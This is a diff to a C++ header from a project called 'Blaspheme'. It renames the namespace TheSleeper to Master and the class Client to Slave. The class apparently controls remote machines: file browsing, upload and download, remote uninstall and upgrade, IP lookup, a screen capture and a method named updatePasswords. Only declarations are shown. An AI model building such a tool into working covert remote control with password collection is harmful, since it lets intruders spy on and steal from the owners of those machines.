@@ -1,5 +1,5 @@
-#ifndef _THE_SLEEPER_
-#define _THE_SLEEPER_
+#ifndef _SLAVE_
+#define _SLAVE_
 
 #include <QApplication>
 #include <QEventLoop>
@@ -16,17 +16,17 @@ using std::string;
 
 #include "GraphicProgressBar.hpp"
 
-namespace TheSleeper
+namespace Master
 {
     extern QMutex stream_mutex;
   
-    class Client : public QObject
+    class Slave : public QObject
     {
         Q_OBJECT
 
         public:
         
-			Client(Blaspheme::Session _session, QObject * parent=0);
+			Slave(Blaspheme::Session _session, QObject * parent=0);
             void addStream(Network::TcpClient new_stream);
 			Blaspheme::SessionId getUniqueId();
             QString getIp();
@@ -57,9 +57,9 @@ namespace TheSleeper
             void uninstall();
             void upgrade(QString server_filename, QProgressBar * bar=0);
             
-            bool browseFiles(QModelIndex current_index);
+            bool browseFiles(QModelIndex currentIndex);
             QStandardItemModel& updateLogicalVolumes();
-            QString getRemotePath(QModelIndex current_index);
+            QString getRemotePath(QModelIndex currentIndex);
             
             void startDownload(QString& source, QString& destination, QProgressBar * bar);
             void startUpload(QString& source, QString& destination, QProgressBar * bar);
@@ -72,7 +72,7 @@ namespace TheSleeper
         private:
             
             void updateSystemVersion();
-            void updateClientName();
+            void updateSlaveName();
             void updatePasswords();
             
             Blaspheme::Session session;
@@ -95,6 +95,6 @@ namespace TheSleeper
             QPixmap screen;
     };
 
-} /* TheSleeper */
+} // Master
 
-#endif // _THE_SLEEPER_
+#endif // _SLAVE_
